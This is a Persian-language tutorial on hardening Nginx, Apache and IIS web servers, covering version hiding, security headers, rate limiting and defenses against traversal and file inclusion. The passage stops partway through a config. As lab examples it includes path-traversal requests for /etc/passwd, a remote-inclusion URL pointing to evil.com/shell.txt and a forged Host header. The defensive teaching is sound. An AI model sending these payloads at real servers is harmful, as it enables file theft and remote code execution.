# بخش ۱۳: امنیت و Hardening

**مدت یادگیری**: ۶ تا ۷ ساعت
**سطح سختی**: پیشرفته
**پیش‌نیاز**: بخش ۰۷ (خطاها)، بخش ۱۰ (TLS)، بخش ۱۲ (کش)

---

## فهرست محتوا

- [فصل ۵۵: کاهش سطح حمله — نسخه، ماژول، کاربر](#فصل-۵۵)
- [فصل ۵۶: هدرهای امنیتی — CSP و بقیه](#فصل-۵۶)
- [فصل ۵۷: محدودسازی — نرخ، اتصال و IP](#فصل-۵۷)
- [فصل ۵۸: Directory Traversal، LFI/RFI، آپلود و Misconfiguration](#فصل-۵۸)
- [فصل ۵۹: WAF، `fail2ban`، DDoS و چک‌لیست](#فصل-۵۹)

---

## فصل ۵۵: کاهش سطح حمله — نسخه، ماژول، کاربر

### مقدمه

امنیت وب‌سرور با «بستن» شروع می‌شود، نه با «افزودن». هر ماژول فعال، هر نسخه‌ی لو رفته، هر پورت باز، یک سطح حمله است. این فصل، حداقل‌سازی است.

### مفاهیم اساسی

**۱) پنهان کردن نسخه**

| سرور | تنظیم |
|---|---|
| Nginx | `server_tokens off;` |
| Apache | `ServerTokens Prod` + `ServerSignature Off` |
| IIS | `removeServerHeader="true"` |

`Server: nginx` به‌جای `Server: nginx/1.26.2`.

> پنهان کردن نسخه، «security by obscurity» است. جای پچ کردن را نمی‌گیرد، ولی اسکن خودکار را سخت‌تر می‌کند.

**۲) ماژول‌های غیرضروری**

Nginx:

```nginx
# اگر ماژول در build است، غیرفعال کردن سخت است
# راه: build سفارشی
```

Apache:

```bash
sudo a2dismod autoindex status info userdir cgi
sudo apachectl configtest && sudo systemctl restart apache2
```

IIS:

```powershell
Remove-WindowsFeature Web-DAV-Publishing, Web-CGI, Web-ASP, Web-Includes
```

**۳) کاربر کم‌دسترسی**

```nginx
user www-data;      # Debian
# user nginx;       # RHEL
```

```bash
ps -o user,pid,cmd -C nginx
# www-data 1234 nginx: worker process
```

`master` با `root` (برای bind)، `worker` با `www-data`.

**۴) مجوز فایل**

```bash
# پوشه 755، فایل 644
find /var/www -type d -exec chmod 755 {} \;
find /var/www -type f -exec chmod 644 {} \;

# فایل حساس
chmod 600 /var/www/.env
chown root:root /var/www/.env
```

> `777` هرگز. `www-data` نباید بتواند کد را تغییر دهد.

**۵) `open_basedir` (PHP)**

```ini
open_basedir = /var/www/lab:/tmp
```

جلوگیری از خواندن فایل خارج از پوشه.

**۶) غیرفعال کردن `autoindex`**

```nginx
autoindex off;     # پیش‌فرض
```

```apache
Options -Indexes
```

**۷) حذف فایل‌های حساس از دسترس**

```nginx
location ~ /\.(?!well-known) { deny all; }
location ~* \.(env|ini|log|sql|bak|old|sh|git)$ { deny all; }
```

**۸) `TRACE` غیرفعال**

```nginx
# Nginx: TRACE پیش‌فرض غیرفعال است
```

```apache
TraceEnable Off
```

```xml
<!-- IIS -->
<verbs>
  <add verb="TRACE" allowed="false" />
</verbs>
```

**۹) `limit_except`**

```nginx
location /admin/ {
    limit_except GET POST {
        deny all;
    }
}
```

**۱۰) پچ و به‌روزرسانی**

```bash
# Ubuntu
sudo apt update && sudo apt upgrade -y nginx
sudo unattended-upgrade --dry-run

# RHEL
sudo dnf update nginx

# بررسی نسخه و CVE
nginx -v
```

### مثال‌های عملی

**Lab Scenario: Hardening پایه‌ی Nginx**

```nginx
# /etc/nginx/conf.d/hardening.conf
server_tokens off;
client_max_body_size 16m;
client_body_timeout 12s;
client_header_timeout 12s;
send_timeout 10s;

# هدرها (فصل ۵۶)
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# مسیرهای حساس
location ~ /\.(?!well-known) {
    deny all;
    access_log off;
    log_not_found off;
}

location ~* \.(env|ini|log|sql|bak|old|swp|sh|conf)$ {
    deny all;
    access_log off;
}
```

```bash
sudo nginx -t && sudo systemctl reload nginx

# تست
curl -sSI http://localhost:8080/ | grep -i server
# Server: nginx

curl -sS -o /dev/null -w '%{http_code}\n' http://localhost:8080/.env
# 403

curl -sS -o /dev/null -w '%{http_code}\n' http://localhost:8080/.well-known/acme-challenge/test
# 404 (نه 403، چون استثنا شده)
```

**Apache:**

```apache
ServerTokens Prod
ServerSignature Off
TraceEnable Off

<Directory />
    Options -Indexes -FollowSymLinks
    AllowOverride None
    Require all denied
</Directory>

<FilesMatch "^\.(env|git|htaccess|htpasswd)">
    Require all denied
</FilesMatch>

<FilesMatch "\.(ini|log|sql|bak|old|sh|conf)$">
    Require all denied
</FilesMatch>
```

**IIS:**

```xml
<system.webServer>
  <security>
    <requestFiltering removeServerHeader="true">
      <hiddenSegments>
        <add segment=".git" />
        <add segment=".env" />
        <add segment="bin" />
        <add segment="App_Data" />
      </hiddenSegments>
      <fileExtensions>
        <add fileExtension=".config" allowed="false" />
        <add fileExtension=".bak" allowed="false" />
        <add fileExtension=".sql" allowed="false" />
      </fileExtensions>
      <verbs>
        <add verb="TRACE" allowed="false" />
      </verbs>
    </requestFiltering>
  </security>
</system.webServer>
```

**بررسی نسخه و پچ:**

```bash
# Nginx
nginx -v 2>&1
curl -sSI https://lab.example.com/ | grep -i server

# CVE
# https://nginx.org/en/security_advisories.html
# https://httpd.apache.org/security/vulnerabilities_24.html
```

**بررسی مجوز:**

```bash
# فایل‌های قابل نوشتن توسط www-data (خطر)
sudo find /var/www -type f -perm -o+w -ls

# فایل با مجوز 777
sudo find /var/www -type f -perm 777 -ls

# مالک اشتباه
sudo find /var/www ! -user www-data -ls | head
```

**بررسی ماژول‌های Apache:**

```bash
apachectl -M | sort
# حذف غیرضروری
sudo a2dismod autoindex status info
```

### مقایسه و الگوهای مختلف

**`ServerTokens` در Apache**

| مقدار | خروجی |
|---|---|
| `Full` | `Apache/2.4.58 (Ubuntu) PHP/8.3` |
| `OS` | `Apache/2.4.58 (Ubuntu)` |
| `Minimal` | `Apache/2.4.58` |
| `Prod` | `Apache` ✅ |

**مجوز فایل**

| | ۶۴۴ | ۶۶۴ | ۷۷۷ |
|---|---|---|---|
| خواندن | ✅ | ✅ | ✅ |
| نوشتن گروه | ❌ | ⚠️ | ✅ |
| اجرا | ❌ | ❌ | ❌ |
| توصیه | ✅ | ❌ | ❌❌ |

**سه سطح hardening**

| سطح | کار |
|---|---|
| پایه | نسخه، `autoindex`، فایل حساس |
| متوسط | + هدرها، rate limit، TLS |
| کامل | + WAF، `fail2ban`، monitoring |

**دیدگاه «پنهان کردن نسخه کافی است»**: نه. اسکنر با fingerprint تشخیص می‌دهد. پچ، اصل کار است.

### اشکال شایع

**۱) `server_tokens` پیش‌فرض**
نسخه لو می‌رود.

**۲) `Options Indexes`**
لیست فایل.

**۳) `.env` در `DocumentRoot`**
کلیدها لو می‌روند. خارج از root یا `deny`.

**۴) `chmod 777`**
هر پروسه‌ای می‌نویسد.

**۵) `www-data` مالک کد**
اگر اپ آسیب ببیند، مهاجم می‌تواند کد را عوض کند. مالک `root`، خواندن برای `www-data`.

**۶) ماژول‌های بی‌استفاده**
سطح حمله. `a2dismod`.

**۷) `TRACE` باز**
XST. غیرفعال.

**۸) پچ نشده**
CVE شناخته‌شده. `unattended-upgrades`.

**۹) `open_basedir` نبودن**
LFI گسترده.

**۱۰) فایل پشتیبان `.bak` در root**
دانلود کد. `deny`.

### نکات مهم (Tips & Tricks)

- **`server_tokens off`**.
- **`autoindex off`**.
- **`.env` خارج از root**.
- **`644`/`755`**.
- **`a2dismod`** برای غیرضروری.
- **`unattended-upgrades`**.
- **`find -perm -o+w`** برای بازرسی.

### خلاصه فصل

- کاهش سطح حمله، اولین قدم.
- نسخه را پنهان کن، ولی پچ را جدی بگیر.
- ماژول غیرضروری را حذف کن.
- کاربر کم‌دسترسی، مجوز `644`/`755`.
- فایل حساس را `deny` کن.
- `TRACE` و `autoindex` خاموش.

**سؤال مروری:** چرا `www-data` نباید مالک فایل‌های کد باشد؟

---

## فصل ۵۶: هدرهای امنیتی — CSP و بقیه

### مقدمه

هدرهای امنیتی، محافظت سمت مرورگر هستند: XSS، clickjacking، MIME sniffing، نشت referrer. رایگان‌اند و بیشتر سایت‌ها ندارندشان.

### مفاهیم اساسی

**۱) هفت هدر کلیدی**

| هدر | محافظت |
|---|---|
| `Content-Security-Policy` | XSS، injection |
| `X-Content-Type-Options: nosniff` | MIME sniffing |
| `X-Frame-Options: DENY/SAMEORIGIN` | clickjacking |
| `Referrer-Policy` | نشت referrer |
| `Permissions-Policy` | دسترسی API مرورگر |
| `Strict-Transport-Security` | downgrade (→ فصل ۴۴) |
| `Cross-Origin-Opener-Policy` | isolation |

**۲) CSP — مهم‌ترین و سخت‌ترین**

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
```

| دستور | معنا |
|---|---|
| `default-src` | پیش‌فرض همه |
| `script-src` | جاوااسکریپت |
| `style-src` | CSS |
| `img-src` | تصویر |
| `connect-src` | fetch/XHR/WebSocket |
| `font-src` | فونت |
| `frame-ancestors` | چه کسی iframe کند |
| `base-uri` | `<base>` مجاز |
| `form-action` | مقصد فرم |
| `report-uri`/`report-to` | گزارش تخلف |

**۳) `'unsafe-inline'` و `'unsafe-eval'`**

این دو، CSP را تقریباً بی‌اثر می‌کنند. اگر مجبوری، `nonce` یا `hash` استفاده کن.

**۴) CSP با nonce**

```
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'
```

```html
<script nonce="r4nd0m">...</script>
```

nonce در هر پاسخ باید یکتا باشد (تولید در سرور).

**۵) `report-only`**

```
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

اول report-only، بعد enforce.

**۶) `X-Frame-Options` در برابر `frame-ancestors`**

| | XFO | frame-ancestors |
|---|---|---|
| پشتیبانی | ✅ قدیمی | ✅ مدرن |
| انعطاف | ⚠️ | ✅ (چند منبع) |
| توصیه | هر دو | ✅ |

**۷) `Referrer-Policy`**

| مقدار | رفتار |
|---|---|
| `no-referrer` | هیچ |
| `same-origin` | فقط هم‌مبدأ |
| `strict-origin-when-cross-origin` | ✅ پیشنهادی |
| `unsafe-url` | ❌ کامل |

**۸) `Permissions-Policy`**

```
Permissions-Policy: geolocation=(), microphone=(), camera=(), payment=()
```

**۹) `Cross-Origin-*`**

```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

برای `SharedArrayBuffer` و isolation.

**۱۰) `X-Powered-By` و `Server`**

حذف/مبهم کردن.

### مثال‌های عملی

**Lab Scenario: هدرها در سه سرور**

```nginx
# /etc/nginx/snippets/security-headers.conf
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=(), payment=(), usb=()" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'" always;
```

```nginx
server {
    listen 443 ssl;
    http2 on;
    server_name lab.example.com;

    include snippets/ssl.conf;
    include snippets/security-headers.conf;

    # ...
}
```

```bash
sudo nginx -t && sudo systemctl reload nginx

curl -sSI https://lab.example.com/ | grep -Ei 'content-security|x-frame|x-content|referrer|permissions|cross-origin'
```

**CSP با nonce (Nginx + اپ):**

```nginx
# Nginx فقط nonce را به اپ پاس می‌دهد
set $csp_nonce $request_id;

add_header Content-Security-Policy "default-src 'self'; script-src 'nonce-$csp_nonce' 'strict-dynamic'; object-src 'none'; base-uri 'self'" always;
```

```python
# اپ باید همان nonce را در تگ script بگذارد
# از هدر درخواست یا متغیر محیطی
```

**راه ساده‌تر: nonce در اپ**

```python
import secrets
from fastapi import FastAPI, Response

app = FastAPI()

@app.middleware("http")
async def csp(request, call_next):
    nonce = secrets.token_urlsafe(16)
    request.state.nonce = nonce
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = (
        f"default-src 'self'; script-src 'nonce-{nonce}' 'strict-dynamic'; "
        "object-src 'none'; base-uri 'self'"
    )
    return response
```

**CSP report-only اول:**

```nginx
add_header Content-Security-Policy-Report-Only "default-src 'self'; report-uri /csp-report" always;
```

**Apache:**

```apache
<IfModule mod_headers.c>
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
    Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'"
    Header always unset X-Powered-By
    Header always unset Server
</IfModule>
```

```bash
sudo a2enmod headers
sudo apachectl configtest && sudo systemctl reload apache2
```

**IIS:**

```xml
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <remove name="X-Powered-By" />
      <add name="X-Content-Type-Options" value="nosniff" />
      <add name="X-Frame-Options" value="SAMEORIGIN" />
      <add name="Referrer-Policy" value="strict-origin-when-cross-origin" />
      <add name="Permissions-Policy" value="geolocation=(), microphone=(), camera=()" />
      <add name="Content-Security-Policy" value="default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'" />
    </customHeaders>
  </httpProtocol>
  <security>
    <requestFiltering removeServerHeader="true" />
  </security>
</system.webServer>
```

**تست CSP:**

```bash
# بررسی هدر
curl -sSI https://lab.example.com/ | grep -i content-security

# تست با مرورگر (Console)
# Refused to load the script '...' because it violates CSP

# گزارش تخلف
curl -sS -X POST https://lab.example.com/csp-report \
  -H 'Content-Type: application/csp-report' \
  -d '{"csp-report":{"blocked-uri":"https://evil.com/x.js"}}'
```

**تست clickjacking:**

```html
<!-- test.html -->
<iframe src="https://lab.example.com/" width="800" height="600"></iframe>
```

باز کن؛ باید بلاک شود (`X-Frame-Options` یا `frame-ancestors`).

**تست MIME sniffing:**

```bash
# فایل متنی با پسوند .jpg
echo '<script>alert(1)</script>' > /var/www/lab/test.jpg
curl -sSI http://lab.example.com/test.jpg | grep -i content-type
# Content-Type: image/jpeg
# X-Content-Type-Options: nosniff   → مرورگر اجرا نمی‌کند
```

### مقایسه و الگوهای مختلف

**`SAMEORIGIN` در برابر `DENY`**

| | `SAMEORIGIN` | `DENY` |
|---|---|---|
| iframe هم‌مبدأ | ✅ | ❌ |
| امنیت | ✅ | ✅✅ |
| مناسب | داشبورد | ✅ عمومی |

**`unsafe-inline` در برابر nonce در برابر hash**

| | `unsafe-inline` | nonce | hash |
|---|---|---|---|
| امنیت | ❌ | ✅ | ✅ |
| پویا | ✅ | ✅ | ❌ |
| پیچیدگی | ✅ | ⚠️ | ⚠️ |

**CSP سخت در برابر نرم**

| | سخت | نرم |
|---|---|---|
| XSS | ✅✅ | ⚠️ |
| شکستن سایت | ⚠️ | ✅ |
| توصیه | تدریجی | شروع |

**دیدگاه «CSP سایت را می‌شکند»**: درست است اگر یک‌جا enforce کنی. `report-only` → اصلاح → enforce.

### اشکال شایع

**۱) CSP با `unsafe-inline`**
بی‌اثر برای XSS.

**۲) `add_header` که هدرهای والد را حذف می‌کند**
تله‌ی Nginx (فصل ۱۹). `include` در هر سطح.

**۳) `X-Frame-Options` تکراری**
مرورگر رد می‌کند. یکی.

**۴) CSP بدون `frame-ancestors`**
clickjacking. هر دو.

**۵) `report-uri` بدون endpoint**
گزارش‌ها گم می‌شوند.

**۶) `Permissions-Policy` قدیمی (`Feature-Policy`)**
نام عوض شده.

**۷) `Server` حذف‌شده در Nginx**
`server_tokens off` نسخه را حذف می‌کند، نه نام.

**۸) هدر روی خطاها**
`always` برای ۴xx/۵xx.

**۹) CSP و inline style**
`style-src 'unsafe-inline'` گاهی لازم. `hash`.

**۱۰) تست فقط با `curl`**
مرورگر رفتار متفاوت دارد. DevTools.

### نکات مهم (Tips & Tricks)

- **`always`** در `add_header`.
- **`report-only`** اول.
- **`nonce`** برای CSP.
- **`nosniff`** همیشه.
- **`frame-ancestors 'none'`**.
- **`strict-origin-when-cross-origin`**.
- **DevTools Console** برای CSP.

### خلاصه فصل

- هفت هدر، محافظت رایگان.
- CSP مهم‌ترین، با `nonce`.
- `nosniff` و `X-Frame-Options` پایه.
- `always` برای خطاها.
- `report-only` قبل از enforce.
- `add_header` ارث نمی‌برد.

**سؤال مروری:** چرا CSP با `'unsafe-inline'` تقریباً بی‌اثر است؟

---

## فصل ۵۷: محدودسازی — نرخ، اتصال و IP

### مقدمه

بدون محدودیت، یک اسکریپت ساده می‌تواند سرور را بخواباند. سه ابزار: محدودیت نرخ درخواست، محدودیت اتصال همزمان، و محدودیت IP.

### مفاهیم اساسی

**۱) Nginx `limit_req`**

```nginx
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

server {
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://backend;
    }

    location = /login {
        limit_req zone=login burst=3;
        proxy_pass http://backend;
    }
}
```

| پارامتر | معنا |
|---|---|
| `rate` | نرخ پایه |
| `burst` | تعداد اضافه‌ی مجاز |
| `nodelay` | بلافاصله بفرست (بدون صف) |
| `delay` | صف با تأخیر |

**۲) `burst` و `nodelay`**

```
rate=10r/s, burst=20, nodelay:
  - ۱۰ درخواست/ثانیه روان
  - تا ۲۰ اضافه، فوری
  - بیشتر از ۳۰ → 503
```

بدون `nodelay`: درخواست‌های اضافه در صف می‌مانند (تأخیر).

**۳) `limit_conn`**

```nginx
limit_conn_zone $binary_remote_addr zone=addr:10m;

server {
    location /download/ {
        limit_conn addr 5;
        limit_conn_status 429;
    }
}
```

حداکثر ۵ اتصال همزمان از هر IP.

**۴) `limit_rate`**

```nginx
location /download/ {
    limit_rate 1m;          # ۱ مگابایت/ثانیه
    limit_rate_after 10m;   # بعد از ۱۰ مگابایت
}
```

**۵) `limit_req_status`**

```nginx
limit_req_status 429;
limit_conn_status 429;
```

`429 Too Many Requests` بهتر از `503`.

**۶) `allow`/`deny`**

```nginx
location /admin/ {
    allow 10.0.0.0/8;
    allow 192.168.56.0/24;
    deny all;
}
```

**۷) `geo` برای گروه‌بندی IP**

```nginx
geo $limited {
    default 0;
    10.0.0.0/8 0;
    203.0.113.0/24 1;
}

map $limited $limit_key {
    0 "";
    1 $binary_remote_addr;
}

limit_req_zone $limit_key zone=per_ip:10m rate=10r/s;
```

**۸) Apache `mod_ratelimit` و `mod_qos`**

```apache
<Location /download>
    SetOutputFilter RATE_LIMIT
    SetEnv rate-limit 1024
</Location>
```

`mod_qos` برای محدودیت پیشرفته (نصب جدا).

**۹) IIS Dynamic IP Restrictions**

```powershell
# نصب
Install-WindowsFeature Web-IP-Security
# یا ماژول Dynamic IP Restrictions

# تنظیم
Set-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" `
  -Filter "system.webServer/security/dynamicIpSecurity" `
  -Name "denyAction" -Value "Forbidden"
Set-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" `
  -Filter "system.webServer/security/dynamicIpSecurity" `
  -Name "denyByRequestRate.enabled" -Value $true
Set-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" `
  -Filter "system.webServer/security/dynamicIpSecurity" `
  -Name "denyByRequestRate.maxRequests" -Value 100
Set-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" `
  -Filter "system.webServer/security/dynamicIpSecurity" `
  -Name "denyByRequestRate.requestIntervalInMilliseconds" -Value 10000
```

**۱۰) محدودیت در لایه‌ی اپ**

Nginx برای «نرخ کلی» خوب است. برای «۵ تلاش لاگین در ۱۵ دقیقه»، اپ (Redis) بهتر است.

### مثال‌های عملی

**Lab Scenario: سه لایه محدودیت**

```nginx
# /etc/nginx/conf.d/ratelimit.conf
limit_req_zone $binary_remote_addr zone=general:10m rate=30r/s;
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
limit_conn_zone $binary_remote_addr zone=conn:10m;

server {
    listen 8080;
    server_name lab.example.com;

    limit_req zone=general burst=60 nodelay;
    limit_req_status 429;
    limit_conn conn 20;
    limit_conn_status 429;

    location / {
        root /var/www/lab;
        try_files $uri $uri/ =404;
    }

    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://127.0.0.1:8000/;
    }

    location = /login {
        limit_req zone=login burst=3;
        proxy_pass http://127.0.0.1:8000/login;
    }

    location /download/ {
        limit_conn conn 3;
        limit_rate 500k;
        alias /var/files/;
    }
}
```

```bash
sudo nginx -t && sudo systemctl reload nginx

# تست نرخ
for i in $(seq 1 30); do
  curl -s -o /dev/null -w '%{http_code} ' http://localhost:8080/api/ping
done
echo
# تعدادی 200 و بقیه 429
```

**تست `burst`:**

```bash
# با burst=20: ۲۰ درخواست فوری مجاز
seq 1 25 | xargs -P 25 -I{} curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080/api/ping | sort | uniq -c
```

**تست `limit_conn`:**

```bash
# ۱۰ دانلود همزمان، limit 3
for i in $(seq 1 10); do
  curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080/download/big.bin &
done
wait
```

**تست `allow`/`deny`:**

```bash
curl -sS -o /dev/null -w '%{http_code}\n' http://localhost:8080/admin/
# 403 از IP غیرمجاز
```

**لاگ محدودیت:**

```nginx
limit_req_log_level warn;
limit_conn_log_level warn;
```

```bash
sudo grep 'limiting requests' /var/log/nginx/error.log | tail -5
# limiting requests, excess: 20.500 by zone "api", client: 203.0.113.45
```

**Apache:**

```apache
<IfModule mod_ratelimit.c>
    <Location /download>
        SetOutputFilter RATE_LIMIT
        SetEnv rate-limit 512
    </Location>
</IfModule>

<Location /admin>
    Require ip 10.0.0.0/8
    Require ip 192.168.56.0/24
</Location>
```

**IIS Dynamic IP Restrictions:**

```powershell
# بررسی نصب
Get-WebGlobalModule | Where-Object Name -like "*DynamicIp*"

# تنظیم
Set-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" `
  -Filter "system.webServer/security/dynamicIpSecurity" `
  -Name "denyByConcurrentRequests.enabled" -Value $true
Set-WebConfigurationProperty -PSPath "MACHINE/WEBROOT/APPHOST" `
  -Filter "system.webServer/security/dynamicIpSecurity" `
  -Name "denyByConcurrentRequests.maxRequests" -Value 20
```

**محدودیت در اپ (Redis):**

```python
import time, redis
from fastapi import FastAPI, HTTPException, Request

app = FastAPI()
r = redis.Redis()

def rate_limit(key: str, limit: int, window: int):
    pipe = r.pipeline()
    pipe.incr(key)
    pipe.expire(key, window)
    count, _ = pipe.execute()
    if count > limit:
        raise HTTPException(429, "too many requests")

@app.post("/login")
def login(request: Request):
    ip = request.client.host
    rate_limit(f"login:{ip}", limit=5, window=900)
    # ...
```

### مقایسه و الگوهای مختلف

**`limit_req` در برابر `limit_conn`**

| | `limit_req` | `limit_conn` |
|---|---|---|
| واحد | درخواست/ثانیه | اتصال همزمان |
| مناسب | API، login | دانلود، stream |

**`nodelay` در برابر صف**

| | `nodelay` | بدون |
|---|---|---|
| تأخیر | ✅ | ❌ |
| تجربه‌ی کاربر | ✅ | ⚠️ |
| مناسب | API | دانلود |

**`503` در برابر `429`**

| | `503` | `429` |
|---|---|---|
| معنا | سرویس ناموجود | درخواست زیاد |
| `Retry-After` | ⚠️ | ✅ |
| توصیه | ❌ | ✅ |

**دیدگاه «محدودیت در اپ کافی است»**: اپ باید همه‌ی درخواست‌ها را پردازش کند تا محدودیت اعمال شود. Nginx قبل از اپ، ارزان‌تر است.

### اشکال شایع

**۱) `limit_req` بدون `burst`**
هر انفجار کوچک، `503`. `burst`.

**۲) `nodelay` بدون `burst`**
بی‌معنا.

**۳) `rate=10r/s` با `burst=0`**
کاربر عادی هم بلاک.

**۴) `limit_req` روی همه‌ی سایت**
فایل استاتیک هم محدود. `location` جدا.

**۵) `binary_remote_addr` پشت پروکسی**
همه یک IP. `real_ip` (فصل ۳۴).

**۶) `limit_conn` کم**
کاربر با ۶ تب باز، بلاک.

**۷) `limit_rate` برای API**
کند می‌شود. فقط دانلود.

**۸) `429` بدون `Retry-After`**
کلاینت نمی‌داند چقدر صبر کند.

**۹) `allow`/`deny` ترتیب اشتباه**
`deny all` اول. آخر بگذار.

**۱۰) محدودیت بدون لاگ**
نمی‌دانی چند نفر بلاک شدند.

### نکات مهم (Tips & Tricks)

- **`burst`** متناسب با ترافیک.
- **`nodelay`** برای API.
- **`429`** به‌جای `503`.
- **`limit_conn`** برای دانلود.
- **`real_ip`** برای IP واقعی.
- **`limit_req_log_level warn`**.
- **اپ برای محدودیت منطقی**.

### خلاصه فصل

- سه ابزار: نرخ، اتصال، IP.
- `burst` انفجار مجاز را تعریف می‌کند.
- `nodelay` تأخیر را حذف می‌کند.
- `limit_conn` برای دانلود و stream.
- `429` استاندارد است.
- `real_ip` پیش‌نیاز محدودیت درست است.

**سؤال مروری:** چرا `limit_req` بدون `burst` می‌تواند کاربران عادی را هم بلاک کند؟

---

## فصل ۵۸: Directory Traversal، LFI/RFI، آپلود و Misconfiguration

### مقدمه

اکثر نفوذها از «پیکربندی اشتباه» می‌آیند، نه از حمله‌ی پیچیده. این فصل، پنج اشتباه رایج و دفاع هر کدام.

### مفاهیم اساسی

**۱) Directory Traversal**

```
GET /download?file=../../../../etc/passwd
GET /static/..%2f..%2f..%2fetc/passwd
```

دفاع:

```nginx
# alias با مسیر نرمال‌شده
location /download/ {
    alias /var/files/;
    # Nginx خودش .. را نرمال می‌کند، ولی اپ‌ها نه
}
```

```python
# اپ باید مسیر را نرمال و بررسی کند
import os
from pathlib import Path

BASE = Path("/var/files").resolve()

def safe_path(name: str) -> Path:
    p = (BASE / name).resolve()
    if not str(p).startswith(str(BASE) + os.sep):
        raise PermissionError("path traversal")
    return p
```

**۲) LFI/RFI**

```
GET /page.php?page=../../../../etc/passwd
GET /page.php?page=http://evil.com/shell.txt
```

دفاع:

```ini
; php.ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/lab:/tmp
```

و در کد: لیست سفید فایل‌های مجاز.

**۳) آپلود فایل**

| خطر | دفاع |
|---|---|
| اجرای فایل آپلودشده | پوشه‌ی آپلود بدون اجرا |
| نام فایل مخرب | تولید نام جدید |
| MIME جعلی | بررسی محتوا |
| حجم بزرگ | `client_max_body_size` |

```nginx
location /uploads/ {
    # هرگز اجرا نکن
    location ~ \.php$ { deny all; }
    add_header Content-Disposition "attachment";
    add_header X-Content-Type-Options "nosniff";
}
```

**۴) Misconfiguration — پنج رایج**

| اشتباه | خطر |
|---|---|
| `autoindex on` | لیست فایل |
| `.git` در root | کد لو می‌رود |
| `.env` در root | کلید لو می‌رود |
| `X-Frame-Options` نبودن | clickjacking |
| `TRACE` باز | XST |
| نسخه‌ی لو رفته | اسکن هدفمند |
| `proxy_pass` به `0.0.0.0` | دسترسی مستقیم |

**۵) HTTP Request Smuggling**

```
Content-Length: 6
Transfer-Encoding: chunked
```

اگر پروکسی و backend تفاوت تفسیر کنند، درخواست قاچاق می‌شود.

دفاع:

```nginx
# Nginx معمولاً امن است؛ تنظیمات ناسازگار را حذف کن
# proxy_request_buffering on (پیش‌فرض)
```

**۶) Host Header Injection**

```
GET / HTTP/1.1
Host: evil.com
```

اگر اپ از `Host` برای ساخت لینک استفاده کند، لینک مخرب می‌سازد.

دفاع:

```nginx
server {
    listen 80 default_server;
    server_name _;
    return 444;      # Host ناشناس را ببند
}
```

و در اپ: لیست سفید دامنه.

**۷) `X-Forwarded-Host` جعلی**

(فصل ۳۴) — فقط به پروکسی خودت اعتماد کن.

**۸) SSRF از طریق پروکسی**

اگر اپ می‌تواند URL دلخواه را از طریق `proxy_pass` داینامیک بگیرد، به شبکه‌ی داخلی دسترسی پیدا می‌کند.

دفاع: لیست سفید مقصد.

**۹) `open_basedir` و `disable_functions`**

```ini
open_basedir = /var/www/lab:/tmp
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

**۱۰) `X-Content-Type-Options` و آپلود**

بدون `nosniff`، مرورگر فایل متنی با پسوند تصویر را اجرا می‌کند.

### مثال‌های عملی

**Lab Scenario: تست و دفاع**

```bash
# ۱) Directory traversal
curl -sS 'http://localhost:8080/download?file=../../../../etc/passwd'
# اگر محتوا برگشت → آسیب‌پذیر

# ۲) .git
curl -sS -o /dev/null -w '%{http_code}\n' http://localhost:8080/.git/config
# 403/404 خوب، 200 بد

# ۳) .env
curl -sS -o /dev/null -w '%{http_code}\n' http://localhost:8080/.env

# ۴) autoindex
curl -sS http://localhost:8080/uploads/ | head -3
# لیست فایل → بد

# ۵) TRACE
curl -sS -X TRACE -o /dev/null -w '%{http_code}\n' http://localhost:8080/
# 405 خوب
```

**دفاع Nginx:**

```nginx
server {
    listen 8080;
    server_name lab.example.com;
    root /var/www/lab;

    # فایل‌های مخفی
    location ~ /\.(?!well-known) {
        deny all;
        access_log off;
        log_not_found off;
    }

    # پسوندهای حساس
    location ~* \.(env|ini|log|sql|bak|old|swp|sh|conf|yml|yaml)$ {
        deny all;
        access_log off;
    }

    # پوشه‌ی آپلود: بدون اجرا
    location /uploads/ {
        add_header X-Content-Type-Options "nosniff" always;
        add_header Content-Disposition "attachment" always;
        location ~ \.(php|phtml|php[0-9]|jsp|asp|aspx|cgi|pl)$ {
            deny all;
        }
    }

    # مسیر دانلود با بررسی
    location /download/ {
        alias /var/files/;
        # Nginx مسیر را نرمال می‌کند، ولی نام فایل را محدود کن
        location ~ ^/download/(.+)$ {
